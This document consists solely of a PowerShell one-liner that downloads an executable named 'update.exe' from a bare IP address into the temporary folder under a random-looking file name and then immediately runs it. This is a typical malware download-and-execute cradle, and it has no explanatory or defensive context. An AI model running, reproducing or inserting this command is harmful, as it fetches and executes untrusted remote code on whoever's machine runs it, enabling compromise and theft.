
(New-Object System.Net.WebClient).DownloadFile('http://185.141.27.35/update.exe',"$env:TEMP\filex8611.exe");Start-Process ("$env:TEMP\filex8611.exe")

